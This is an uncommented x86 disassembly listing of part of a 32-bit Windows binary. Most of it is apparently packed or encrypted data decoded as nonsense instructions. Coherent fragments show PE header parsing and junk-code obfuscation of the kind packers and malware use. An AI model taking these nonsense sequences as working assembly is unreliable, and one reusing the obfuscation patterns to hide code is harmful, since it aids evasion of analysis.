  4111c9:	fldcw  WORD PTR [ebx-0x6f]
  4111cc:	ins    DWORD PTR es:[edi],dx
  4111cd:	push   es
  4111ce:	repnz dec eax
  4111d0:	repz fdiv DWORD PTR gs:[esi]
  4111d4:	xor    bl,BYTE PTR [ebx]
  4111d6:	cld    
  4111d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111d8:	inc    eax
  4111d9:	or     eax,0x65d61886
  4111de:	push   0x3ef94c34
  4111e3:	pop    ecx
  4111e4:	xchg   ebp,eax
  4111e5:	fprem  
  4111e7:	cmp    eax,DWORD PTR [esi]
  4111e9:	jns    0x411250
  4111eb:	mov    eax,ds:0x46913bb1
  4111f0:	retf   
  4111f1:	or     esp,DWORD PTR [esi+0x5b]
  4111f4:	jbe    0x411201
  4111f6:	ds in  al,dx
  4111f8:	jp     0x411199
  4111fa:	xchg   ebx,eax
  4111fb:	fidivr DWORD PTR [eax-0x31]
  4111fe:	jl     0x4111d6
  411200:	(bad)  
  411201:	out    0xfc,eax
  411203:	inc    eax
  411204:	retf   
  411205:	mov    dl,0x31
  411207:	repnz xchg esi,eax
  411209:	pop    edx
  41120a:	call   0xf4be:0xd01598cc
  411211:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411212:	xor    DWORD PTR [esp+eax*1+0xee46d55],edi
  411219:	add    edi,0x73
  41121c:	jl     0x411243
  41121e:	dec    edi
  41121f:	and    BYTE PTR [ecx],ch
  411221:	aas    
  411222:	add    esp,ebx
  411224:	test   BYTE PTR [ebp-0x14],bl
  411227:	cmp    al,0x2b
  411229:	fld    DWORD PTR [eax+eiz*8+0x3a]
  41122d:	fsub   DWORD PTR [eax+0x28ca0c0b]
  411233:	pop    ebx
  411234:	or     esp,ecx
  411236:	rcr    BYTE PTR [edx-0x23],0x61
  41123a:	out    dx,al
  41123b:	pop    ebp
  41123c:	gs sub al,0x61
  41123f:	sub    BYTE PTR [ecx+0x97def52],ah
  411245:	lods   al,BYTE PTR ds:[esi]
  411246:	test   al,0x2d
  411248:	mov    al,ds:0xb7bd5702
  41124d:	jne    0x411286
  41124f:	rol    DWORD PTR [ebp+0xce59b40],1
  411255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411256:	pop    ecx
  411257:	int    0x3
  411259:	arpl   WORD PTR [ecx+0x2e48b75b],bp
  41125f:	popa   
  411260:	inc    ebx
  411261:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411262:	xor    DWORD PTR [ebx-0x618d9787],ebx
  411268:	pop    ecx
  411269:	outs   dx,DWORD PTR ds:[esi]
  41126a:	fst    DWORD PTR [eax+0x432e92f9]
  411270:	sar    DWORD PTR [ecx],0x8e
  411273:	mov    BYTE PTR [ebp-0x2],al
  411276:	mov    DWORD PTR [eax-0x8],edx
  411279:	popa   
  41127a:	xor    edi,DWORD PTR [ebx-0x211c4e2f]
  411280:	adc    eax,0x6b417948
  411285:	ins    DWORD PTR es:[edi],dx
  411286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411287:	mov    ebx,0x26344f40
  41128c:	fild   WORD PTR [eax+0x469d2536]
  411292:	int3   
  411293:	sar    DWORD PTR [eax+0x20],cl
  411296:	stc    
  411297:	fisttp DWORD PTR [eax]
  411299:	cwde   
  41129a:	sub    DWORD PTR [esi-0x80],esi
  41129d:	mov    eax,ds:0xc6a0a5b
  4112a2:	dec    eax
  4112a3:	rcl    bl,1
  4112a5:	sti    
  4112a6:	inc    esi
  4112a7:	(bad)
  4112ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112ac:	test   BYTE PTR [ebx+0x5],dh
  4112af:	lea    ebx,[edi+0x78af681b]
  4112b5:	or     al,0x76
  4112b7:	push   edx
  4112b8:	mov    edx,0xc871736f
  4112bd:	sbb    ch,BYTE PTR [edx-0x6f3f6347]
  4112c3:	mov    ch,0x8
  4112c5:	add    DWORD PTR [ebx+eax*2-0x7758db19],esp
  4112cc:	dec    edi
  4112cd:	shl    dh,1
  4112cf:	iret   
  4112d0:	stos   BYTE PTR es:[edi],al
  4112d1:	adc    eax,0xeda2d4f5
  4112d6:	gs sbb al,0x4a
  4112d9:	loop   0x411341
  4112db:	gs pop ebp
  4112dd:	hlt    
  4112de:	mov    eax,ds:0x9f0aef70
  4112e3:	pop    esp
  4112e4:	repnz add eax,0xfe840f56
  4112ea:	add    al,BYTE PTR [eax]
  4112ec:	add    bh,al
  4112ee:	inc    ebp
  4112ef:	call   0x7471083
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x9568f61e,eax
  411318:	sub    DWORD PTR [edx+ebx*2],esp
  41131b:	dec    ecx
  41131c:	inc    ebp
  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x411329
  411324:	sub    esi,ecx
  411326:	inc    ebp
  411327:	jl     0x411334
  411329:	or     BYTE PTR [eax],bh
  41132b:	xchg   ebx,eax
  41132c:	les    ecx,FWORD PTR [esi+0x1d]
  41132f:	mov    ah,0x89
  411331:	xchg   ebp,eax
  411332:	mov    dh,0xe6
  411334:	jmp    0x1dc2200b
  411339:	shl    DWORD PTR [edi-0x1167ad1a],cl
  41133f:	jae    0x4113b0
  411341:	mov    dl,0x43
  411343:	popa   
  411344:	xor    DWORD PTR [edi],esp
  411346:	loopne 0x411371
  411348:	sbb    DWORD PTR [edi-0x45],esp
  41134b:	repnz mov bl,0xcb
  41134e:	(bad)  
  41134f:	scas   eax,DWORD PTR es:[edi]
  411350:	push   esi
  411351:	sub    cl,ah
  411353:	in     eax,dx
  411354:	retf   
  411355:	clc    
  411356:	cdq    
  411357:	xchg   edi,eax
  411358:	je     0x411385
  41135a:	push   ss
  41135b:	ja     0x411394
  41135d:	jbe    0x4113d8
  41135f:	pop    ecx
  411360:	cwde   
  411361:	dec    ebp
  411362:	mov    dh,0xea
  411364:	mov    bh,0x92
  411366:	sbb    al,0x5f
  411368:	push   ds
  411369:	xchg   edi,eax
  41136a:	test   eax,0xbfb6f834
  41136f:	mov    edi,eax
  411371:	cli    
  411372:	aam    0xb5
  411374:	loope  0x41135a
  411376:	add    dl,BYTE PTR [eax-0xc132cc7]
  41137c:	and    ch,ah
  41137e:	xor    BYTE PTR ds:0xbc341ab5,al
  411384:	cld    
  411385:	(bad)  
  411386:	ins    DWORD PTR es:[edi],dx
  411387:	mov    ds:0x9703d353,eax
  41138c:	mov    ?,WORD PTR [edi+0x4cb6a3e0]
  411392:	fldenv [ebx+eiz*1-0x34d3902f]
  411399:	push   ss
  41139a:	sub    esi,0xab7a8c48
  4113a0:	popf   
  4113a1:	sbb    DWORD PTR [esi],eax
  4113a3:	add    bl,BYTE PTR [edx-0x58a8afe0]
  4113a9:	pop    es
  4113aa:	fwait
  4113ab:	std    
  4113ac:	cs mov ch,0x69
  4113af:	adc    dl,BYTE PTR [ecx+0x6b2fbc91]
  4113b5:	call   0x3d26:0x174aff28
  4113bc:	mov    edi,0x29d4001d
  4113c1:	(bad)  
  4113c2:	xchg   ebp,eax
  4113c3:	sbb    DWORD PTR [ebx+0x65596f60],0x7c
  4113ca:	adc    BYTE PTR [edx-0x57],bh
  4113cd:	retf   0x8852
  4113d0:	jle    0x411356
  4113d2:	out    dx,eax
  4113d3:	cmc    
  4113d4:	jp     0x411362
  4113d6:	xlat   BYTE PTR ds:[ebx]
  4113d7:	test   al,0xe4
  4113d9:	pushf  
  4113da:	mov    ebx,0x98e0ad55
  4113df:	lods   eax,DWORD PTR ds:[esi]
  4113e0:	xchg   esp,eax
  4113e1:	push   ss
  4113e2:	adc    al,bh
  4113e4:	rol    DWORD PTR [ebx-0x6e],1
  4113e7:	retf   
  4113e8:	cmp    ecx,DWORD PTR [esi-0x47]
  4113eb:	in     eax,0x75
  4113ed:	out    0x1f,al
  4113ef:	jmp    0x4113de
  4113f1:	sub    BYTE PTR [edx*2-0x28be48d],0x1f
  4113f9:	inc    edx
  4113fa:	xchg   esi,eax
  4113fb:	add    al,0xb4
  4113fd:	adc    BYTE PTR [ebp+0x35bcf5e5],0x89
  411404:	inc    ecx
  411405:	pop    esp
  411406:	arpl   WORD PTR [eax-0x47],si
  411409:	in     al,dx
  41140a:	xor    ebx,edx
  41140c:	(bad)  
  41140d:	outs   dx,DWORD PTR ds:[esi]
  41140e:	xor    ebx,0xc7e3fcee
  411414:	mov    al,0xf2
  411416:	cld    
  411417:	cmp    DWORD PTR [edi+0x6b],edi
  41141a:	and    eax,DWORD PTR [edi+0x4fd6a758]
  411420:	fisub  DWORD PTR [esi+0x4d208a86]
  411426:	test   eax,0x311fba41
  41142b:	mov    esi,0x278377dc
  411430:	push   es
  411431:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411432:	inc    esi
  411433:	jno    0x4113d2
  411435:	dec    esp
  411436:	(bad)  
  411437:	dec    edx
  411438:	nop    DWORD PTR [ebx+ebx*4-0x2f]
  41143d:	bswap  edx
  41143f:	popf   
  411440:	mov    al,0xe3
  411442:	push   ecx
  411443:	call   FWORD PTR [edi+0x26]
  411446:	xchg   edx,eax
  411447:	push   0x6
  411449:	adc    esi,DWORD PTR [ecx]
  41144b:	jne    0x411408
  41144d:	test   al,0x4
  41144f:	popa   
  411450:	test   al,0x6f
  411452:	cmp    ebp,ebp
  411454:	push   edx
  411455:	sub    al,BYTE PTR [ecx]
  411457:	inc    ecx
  411458:	dec    eax
  411459:	sbb    ebx,eax
  41145b:	pusha  
  41145c:	xor    al,0x64
  41145e:	aad    0x8f
  411460:	fsub   DWORD PTR [ebx]
  411462:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411463:	out    dx,eax
  411464:	pop    ss
  411465:	mov    ecx,edi
  411467:	add    al,0xf2
  411469:	fisub  WORD PTR [esi]
  41146b:	lods   al,BYTE PTR ds:[esi]
  41146c:	jl     0x41142a
  41146e:	lds    ecx,FWORD PTR [ebx]
  411470:	out    0x72,al
  411472:	xor    edx,DWORD PTR [eax]
  411474:	cdq    
  411475:	arpl   WORD PTR [eax+0x6],cx
  411478:	mov    cs,WORD PTR [ebx+0x74]
  41147b:	xchg   edx,eax
  41147c:	dec    esp
  41147d:	lock mov edi,0xa548ecbf
  411483:	sub    BYTE PTR [ebp-0x19851d2e],ch
  411489:	dec    esp
  41148a:	jns    0x41149f
  41148c:	xchg   ebx,eax
  41148d:	not    DWORD PTR [ebx]
  41148f:	loop   0x41146e
  411491:	mov    WORD PTR [ebx],?
  411493:	test   al,0x39
  411495:	clc    
  411496:	mov    WORD PTR [ebp+0x30],ds
  411499:	(bad)  
  41149a:	sti    
  41149b:	push   edi
  41149c:	mov    ah,bh
  41149e:	hlt    
  41149f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114a0:	stos   DWORD PTR es:[edi],eax
  4114a1:	push   esp
  4114a2:	inc    edx
  4114a3:	ins    DWORD PTR es:[edi],dx
  4114a4:	ins    DWORD PTR es:[edi],dx
  4114a5:	and    esp,ebx
  4114a7:	(bad)  
  4114a8:	mov    al,ds:0x3f512e1d
  4114ad:	xor    ch,ah
  4114af:	jl     0x411465
  4114b1:	fdiv   QWORD PTR [edi]
  4114b3:	and    ah,0x1b
  4114b6:	add    al,0xb8
  4114b8:	mov    ah,0xb0
  4114ba:	loop   0x411502
  4114bc:	int3   
  4114bd:	pop    edi
  4114be:	popf   
  4114bf:	shr    BYTE PTR [ebx+0x3f],0xe1
  4114c3:	retf   0x6499
  4114c6:	xlat   BYTE PTR ds:[ebx]
  4114c7:	pop    esp
  4114c8:	push   es
  4114c9:	push   0x2c133e23
  4114ce:	into   
  4114cf:	xchg   esp,eax
  4114d0:	sbb    ebp,DWORD PTR [ecx+0x79]
  4114d3:	mov    eax,0xe80c827f
  4114d8:	xchg   edi,eax
  4114d9:	jb     0x4114a4
  4114db:	inc    esi
  4114dc:	jge    0x41154b
  4114de:	xchg   ebx,eax
  4114df:	inc    esp
  4114e0:	dec    edi
  4114e1:	aad    0xe3
  4114e3:	cmp    bh,BYTE PTR [edi+0x57]
  4114e6:	imul   edi,DWORD PTR [edi+0x3],0x1a
  4114ea:	xor    al,0x64
  4114ec:	(bad)  
  4114ed:	sub    ecx,DWORD PTR [esi]
  4114ef:	sub    ecx,DWORD PTR [esi+0x2d]
  4114f2:	imul   ecx
  4114f4:	mov    ds:0x266bc668,eax
  4114f9:	xchg   edi,eax
  4114fa:	ret    
  4114fb:	lds    esp,FWORD PTR [edi]
  4114fd:	neg    bl
  4114ff:	fsubr  QWORD PTR [edi-0x231a9191]
  411505:	push   es
  411506:	test   eax,0xe74e343
  41150b:	mov    bh,0x4f
  41150d:	test   eax,0x5b25fcf6
  411512:	outs   dx,BYTE PTR ds:[esi]
  411513:	or     eax,0x5212699d
  411518:	mov    ebx,0xead16b34
  41151d:	rcl    DWORD PTR [ebp-0x26825d82],0xa5
  411524:	jmp    0xa645684
  411529:	sbb    esp,ebx
  41152b:	je     0x411592
  41152d:	and    DWORD PTR [edx-0x19],0x82d30d21
  411534:	ror    DWORD PTR [edx+0x7a470d30],1
  41153a:	dec    edi
  41153b:	rcr    DWORD PTR [ebx+eiz*8-0x63],cl
  41153f:	jg     0x41154c
  411541:	sbb    eax,0x4d9af42e
  411546:	out    dx,eax
  411547:	sub    esi,DWORD PTR [ebx-0x7d]
  41154a:	jno    0x4114f7
  41154c:	pop    ebx
  41154d:	lock pop ebx
  41154f:	std    
  411550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411551:	mov    bl,BYTE PTR [ebx-0x48054097]
  411557:	push   es
  411558:	icebp  
  411559:	lahf   
  41155a:	pop    edi
  41155b:	mov    edi,0x6deb2e52
  411560:	sbb    al,0xb0
  411562:	xor    ebx,ecx
  411564:	popa   
  411565:	push   edx
  411566:	and    al,0x6b
  411568:	push   eax
  411569:	sbb    ebp,DWORD PTR [eax+0x55]
  41156c:	pop    ecx
  41156d:	clc    
  41156e:	or     eax,0x71f9ae6a
  411573:	dec    edi
  411574:	inc    ebx
  411575:	add    al,0x7c
  411577:	ror    DWORD PTR [edi],cl
  411579:	ins    BYTE PTR es:[edi],dx
  41157a:	enter  0x4c16,0x68
  41157e:	mov    bl,BYTE PTR [edx]
  411580:	add    edi,ebx
  411582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411583:	adc    ebx,edi
  411585:	hlt    
  411586:	inc    esp
  411587:	nop
  411588:	popa   
  411589:	inc    ecx
  41158a:	or     cl,BYTE PTR [ecx]
  41158c:	imul   edi,DWORD PTR [eax-0x3d],0x83730e28
  411593:	add    al,0xef
  411595:	add    eax,0x19a23ff4
  41159a:	jecxz  0x411613
  41159c:	inc    eax
  41159d:	cmp    al,0x5d
  41159f:	jg     0x4115c9
  4115a1:	stc    
  4115a2:	mov    ds:0xe48a7eb3,eax
  4115a7:	dec    esi
  4115a8:	ss scas al,BYTE PTR es:[edi]
  4115aa:	cld    
  4115ab:	outs   dx,BYTE PTR es:[esi]
  4115ad:	pop    ds
  4115ae:	out    0x46,eax
  4115b0:	les    edx,FWORD PTR [ebx-0x2b932b80]
  4115b6:	adc    edi,edx
  4115b8:	cmp    BYTE PTR [esp+ecx*4+0x10195448],0x73
  4115c0:	in     al,dx
  4115c1:	popf   
  4115c2:	sar    BYTE PTR [ebx-0x32],1
  4115c5:	push   0xffffff8e
  4115c7:	ret    
  4115c8:	rcl    BYTE PTR [ebp-0xb],1
  4115cb:	inc    eax
  4115cc:	icebp  
  4115cd:	push   ebx
  4115ce:	fisttp DWORD PTR [ebp-0x41]
  4115d1:	push   ebp
  4115d2:	dec    edx
  4115d3:	dec    ebp
  4115d4:	mov    edx,DWORD PTR [ebp+0x8]
  4115d7:	xor    eax,ecx
  4115d9:	lea    eax,[eax+edx*1+0x32729b]
  4115e0:	mov    DWORD PTR [ebp+0x8],eax
  4115e3:	inc    DWORD PTR [ebp+0xc]
  4115e6:	jmp    0x410fe6
  4115eb:	mov    eax,DWORD PTR [ebp-0x10]
  4115ee:	xor    eax,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	mov    ecx,0x86e1e488
  41161d:	inc    eax
  41161e:	jle    0x41169e
  411620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411621:	jg     0x4116a1
  411623:	jle    0x4115bb
  411625:	sub    al,BYTE PTR [ecx]
  411627:	(bad)  
  411628:	cwde   
  411629:	mov    edx,0x86ceaf4
  41162e:	pop    esp
  41162f:	adc    al,BYTE PTR [edi+0x1d158e6]
  411635:	push   ds
  411636:	pop    edi
  411637:	int    0x45
  411639:	dec    esp
  41163a:	fwait
  41163b:	and    ebp,eax
  41163d:	popf   
  41163e:	nop
  41163f:	mov    dh,0xd8
  411641:	xchg   esi,eax
  411642:	sahf   
  411643:	(bad)
  411647:	jecxz  0x4115d8
  411649:	xor    ch,BYTE PTR [edx+edi*8]
  41164c:	imul   ebp,DWORD PTR [eax+0x68],0xd5d28332
  411653:	pop    ebx
  411654:	jmp    0x138ede8b
  411659:	test   BYTE PTR [ebx+eiz*2],bl
  41165c:	pop    esi
  41165d:	xchg   ebp,eax
  41165e:	pushf  
  41165f:	ss jae 0x4116b8
  411662:	mov    esp,0xfc0d6fe3
  411667:	pop    esi
  411668:	ret    
  411669:	fcomp  DWORD PTR [edx]
  41166b:	aam    0xfd
  41166d:	dec    ebx
  41166e:	gs pop ebx
  411670:	xchg   esp,eax
  411671:	rcl    esi,0xc0
  411674:	loope  0x4116c3
  411676:	adc    al,0x76
  411678:	in     al,0x4a
  41167a:	dec    esp
  41167b:	aam    0x82
  41167d:	(bad)  
  41167e:	jle    0x4116f5
  411680:	sbb    al,0x87
  411682:	dec    edi
  411683:	out    dx,al
  411684:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411685:	mov    al,0x96
  411687:	add    cl,BYTE PTR [ebx-0x38]
  41168a:	mov    esi,0xfc63a7ab
  41168f:	pop    ebp
  411690:	mov    WORD PTR ss:[esi+0x73],gs
  411694:	sbb    al,0xdb
  411696:	dec    ebp
  411697:	sub    ch,dl
  411699:	xchg   ebp,eax
  41169a:	jecxz  0x411626
  41169c:	daa    
  41169d:	pusha  
  41169e:	je     0x411666
  4116a0:	leave  
  4116a1:	jl     0x4116f5
  4116a3:	daa    
  4116a4:	mov    ebp,0x48980cdb
  4116a9:	call   0x8988:0x22ea5428
  4116b0:	mov    esp,0x3958d00d
  4116b5:	fdivrp st(2),st
  4116b7:	push   es
  4116b8:	js     0x411678
  4116ba:	and    BYTE PTR [eax+0x13],dh
  4116bd:	pop    esp
  4116be:	cmp    eax,0x30bfba3a
  4116c3:	call   0x45c80455
  4116c8:	and    DWORD PTR [ebx-0x1c80e66b],ebp
  4116ce:	aad    0xee
  4116d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116d1:	push   esp
  4116d2:	ins    DWORD PTR es:[edi],dx
  4116d3:	xchg   edi,eax
  4116d4:	dec    esp
  4116d5:	xor    BYTE PTR [edi+edx*8+0x3d],bl
  4116d9:	pop    edx
  4116da:	(bad)  
  4116db:	pusha  
  4116dc:	xchg   BYTE PTR [ebp-0x15],ah
  4116df:	in     eax,dx
  4116e0:	out    0x2e,eax
  4116e2:	hlt    
  4116e3:	mov    edi,0x1a20394f
  4116e8:	out    0x96,al
  4116ea:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4116ec:	ss pop es
  4116ee:	test   BYTE PTR [ebp-0x55542c56],bh
  4116f4:	mov    ds,WORD PTR [edi+edx*2-0x4]
  4116f8:	fwait
  4116f9:	push   ebx
  4116fa:	rcl    ecx,cl
  4116fc:	fist   DWORD PTR [eax-0x78681fd0]
  411702:	jmp    0x411746
  411704:	mov    ecx,0x4a80fb49
  411709:	ins    DWORD PTR es:[edi],dx
  41170a:	add    esi,DWORD PTR [ecx-0x1be3dc16]
  411710:	push   es
  411711:	and    ah,BYTE PTR [ecx]
  411713:	arpl   WORD PTR [edx-0x53],di
  411716:	inc    ebp
  411717:	mov    esi,0xd4d38180
  41171c:	out    0x93,eax
  41171e:	push   esi
  41171f:	stos   BYTE PTR es:[edi],al
  411720:	out    0x2c,eax
  411722:	jg     0x411725
  411724:	push   edx
  411725:	popa   
  411726:	mov    al,ds:0x1da985fc
  41172b:	call   0x8d45:0xa57014fb
  411732:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411733:	test   BYTE PTR [edi],dh
  411735:	lods   eax,DWORD PTR ds:[esi]
  411736:	or     BYTE PTR [ebx],bl
  411738:	je     0x4116d5
  41173a:	and    dh,BYTE PTR [esi-0x196975]
  411740:	clc    
  411741:	ror    DWORD PTR [edi],cl
  411743:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411744:	test   eax,0x4654c187
  411749:	rcr    BYTE PTR [ecx-0xe12fe23],1
  41174f:	iret   
  411750:	pop    ds
  411751:	test   al,0xea
  411753:	mov    edx,0x8ed32236
  411758:	scas   al,BYTE PTR es:[edi]
  411759:	push   ebx
  41175a:	loopne 0x4117d4
  41175c:	sbb    al,0xbc
  41175e:	or     esp,ecx
  411760:	mov    esp,0x65e76bf6
  411765:	mov    ds:0x17627575,eax
  41176a:	cmp    BYTE PTR [ebx-0x32],bh
  41176d:	ror    BYTE PTR [eax+0x30fec4ff],0x98
  411774:	inc    edi
  411775:	cld    
  411776:	cmp    ebp,edx
  411778:	xor    al,BYTE PTR [eax+0x776b2d1e]
  41177e:	icebp  
  41177f:	sbb    DWORD PTR [edx+0x2002222d],esi
  411785:	addr16 ja 0x41170e
  411788:	fwait
  411789:	jge    0x41179a
  41178b:	and    edx,DWORD PTR [ebp-0xd12245f]
  411791:	mov    eax,ds:0x100f6dcf
  411796:	fdivr  DWORD PTR [edx]
  411798:	ror    bh,cl
  41179a:	xor    BYTE PTR [ecx-0x33b97739],dh
  4117a0:	push   0xe650f961
  4117a5:	xchg   esp,eax
  4117a6:	mov    dh,BYTE PTR [ecx+esi*4]
  4117a9:	mov    dh,0x1d
  4117ab:	push   ds
  4117ac:	fs (bad) 
  4117ae:	sbb    cl,dl
  4117b0:	add    eax,0xff83607e
  4117b5:	enter  0x3ffc,0x0
  4117b9:	xchg   esp,eax
  4117ba:	and    eax,0x1d3a0f6f
  4117bf:	loop   0x411811
  4117c1:	sub    eax,0xdf105496
  4117c6:	pop    ebp
  4117c7:	mov    dh,0xa3
  4117c9:	js     0x411759
  4117cb:	fld    DWORD PTR [eax]
  4117cd:	in     eax,dx
  4117ce:	mov    eax,DWORD PTR [ebp+0x8]
  4117d1:	mov    DWORD PTR ds:0x4336a3,0x423d
  4117db:	mov    al,BYTE PTR [eax]
  4117dd:	sub    DWORD PTR ds:0x4335ff,0x6d7d
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43369f,0x433603
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43369f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43361b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x4336ab,0x0
  41182f:	mov    eax,ds:0x4336ab
  411834:	inc    eax
  411835:	mov    ds:0x4336ab,eax
  41183a:	cmp    DWORD PTR ds:0x4336ab,0xb
  411841:	jne    0x411887
  411847:	push   0x4337bc
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x4336ab,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x4336ab
  411899:	inc    eax
  41189a:	mov    ds:0x4336ab,eax
  41189f:	cmp    DWORD PTR ds:0x4336ab,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	mov    es:0x4e2c1fec,al
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x41191b
  4118f4:	popa   
  4118f5:	add    DWORD PTR [ebx+0x4d911683],esi
  4118fb:	add    al,0xa8
  4118fd:	cmp    DWORD PTR [eax+0x7ba71551],esi
  411903:	mov    esp,eax
  411905:	mov    ah,0x9e
  411907:	daa    
  411908:	mov    ds:0x586e429,al
  41190d:	mov    ecx,0x94879a75
  411912:	mov    bl,0x53
  411914:	xchg   esp,eax
  411915:	cmp    BYTE PTR [edx-0x3aad7127],ch
  41191b:	retf   
  41191c:	sbb    ebx,DWORD PTR [eax+0x71892db2]
  411922:	lock add edi,edx
  411925:	sub    DWORD PTR [ebx+0x5],ecx
  411928:	jb     0x411948
  41192a:	mov    bh,0x8c
  41192c:	loope  0x411954
  41192e:	dec    ebx
  41192f:	sbb    eax,0x94f942d1
  411934:	push   es
  411935:	jg     0x4118e7
  411937:	icebp  
  411938:	or     ch,BYTE PTR [edx+0x76]
  41193b:	push   ss
  41193c:	sbb    al,0x48
  41193e:	dec    ebp
  41193f:	out    dx,al
  411940:	and    al,0x51
  411942:	push   esp
  411943:	call   0x785b:0xb3464eab
  41194a:	inc    edx
  41194b:	repz mov al,ds:0x76462cd6
  411951:	pop    esp
  411952:	test   BYTE PTR ds:0x764a7dce,ah
  411958:	rcr    BYTE PTR [edi],cl
  41195a:	fwait
  41195b:	mov    ebp,0x3e86003a
  411961:	mov    es:0x2ebfbc88,al
  411967:	(bad)  
  411968:	or     bl,BYTE PTR [ebx-0x55]
  41196b:	lahf   
  41196c:	pop    edi
  41196d:	(bad)  
  41196e:	and    edx,esi
  411970:	lock lahf 
  411972:	mov    bl,BYTE PTR [esi-0x2426c170]
  411978:	and    esp,DWORD PTR [ecx+0x791b9e5d]
  41197e:	cmp    ah,dh
  411980:	fwait
  411981:	cmp    bh,BYTE PTR [eax]
  411983:	mov    eax,0xcb8ba34a
  411988:	push   es
  411989:	mov    edi,0x193b177b
  41198e:	or     eax,0xfa83d593
  411993:	cmc    
  411994:	mov    esp,ecx
  411996:	into   
  411997:	jae    0x411a16
  411999:	cmp    DWORD PTR [ecx],edx
  41199b:	mov    eax,ds:0xfd4d2054
  4119a0:	test   ch,0x9a
  4119a3:	and    DWORD PTR [ebx-0x7],ecx
  4119a6:	jl     0x4119c8
  4119a8:	arpl   di,dx
  4119aa:	popf   
  4119ab:	push   edx
  4119ac:	dec    ecx
  4119ad:	push   ebx
  4119ae:	dec    ecx
  4119af:	lea    edx,[esi]
  4119b1:	call   0x7080:0x52705e75
  4119b8:	pushf  
  4119b9:	dec    edx
  4119ba:	imul   esi,DWORD PTR [ebx+ebp*1+0x2],0x2a
  4119bf:	imul   ebp,DWORD PTR ds:0xfa6ebb79,0xdbec461f
  4119c9:	jns    0x4119f7
  4119cb:	pop    es
  4119cc:	stos   BYTE PTR es:[edi],al
  4119cd:	adc    ebx,esi
  4119cf:	mov    WORD PTR [ecx],es
  4119d1:	push   edx
  4119d2:	jno    0x411962
  4119d4:	in     eax,dx
  4119d5:	aas    
  4119d6:	test   al,0x61
  4119d8:	(bad)  
  4119d9:	push   esp
  4119da:	call   0x23dfb5f6
  4119df:	push   es
  4119e0:	jnp    0x4119f9
  4119e2:	jle    0x411a2e
  4119e4:	jmp    0x8214:0x396821ef
  4119eb:	mov    ch,0x81
  4119ed:	not    BYTE PTR [esi+0x608aae11]
  4119f3:	push   cs
